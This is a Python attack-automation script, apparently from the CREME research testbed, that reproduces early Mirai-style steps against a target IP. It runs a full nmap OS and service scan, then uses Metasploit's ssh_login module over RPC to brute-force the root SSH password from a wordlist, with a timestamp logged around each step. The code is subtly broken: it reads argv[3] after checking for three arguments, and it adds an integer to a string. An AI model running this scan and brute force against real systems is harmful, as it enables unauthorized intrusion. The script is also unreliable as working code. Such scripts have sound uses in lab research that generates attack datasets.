# CREME reproduction scanning
# I this step the attacker server try to perform nmap scan to the target server

import time
import sys
import os
from nmap import nmap
from pymetasploit3.msfrpc import MsfRpcClient


################################ timestamp generator ################################
def record_timestamp(folder, output_time_file):
    time_output_file = os.path.join(folder, output_time_file)
    with open(time_output_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    # check total numbers of arguments given
    if len(argv) != 3:
        print("Number of arguments incorrect, please provide "+len(argv)+" arguments")
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
    else:
        pass
    

    # variables initialization
    folder = argv[1]
    target_ip = argv[3]
    
    # metasploit services initialization
    client = MsfRpcClient('kali')
    
    
    ################################ Step 1 Block ################################
    output_time_file_start = 'time_step_1_mirai_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(10)

    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=target_ip, arguments='-O -A -p 0-65535')
    except Exception as e:
        print(e)
        pass

    time.sleep(10)
    output_time_file_end = 'time_step_1_mirai_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(10)
    ################################ Step 1 Block ################################
    
        ################################ Step 2 Block ################################
    output_time_file_start = 'time_step_2_mirai_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(2)

    try:
        auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
        auxiliary['PASS_FILE'] = "/home/kali/Desktop/reinstall/unix_passwords_modified.txt"
        auxiliary['USERNAME'] = "root"
        auxiliary['RHOSTS'] = target_ip
        auxiliary['RPORT'] = 22
        auxiliary['VERBOSE'] = True

        auxiliary.execute()
        print(client.jobs.list)
        while client.jobs.list:
            time.sleep(1)
    except Exception as e:
        print(e)
        pass

    time.sleep(10)
    output_time_file_end = 'time_step_2_mirai_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(2)
    ################################ Step 2 Block ################################


main(sys.argv)
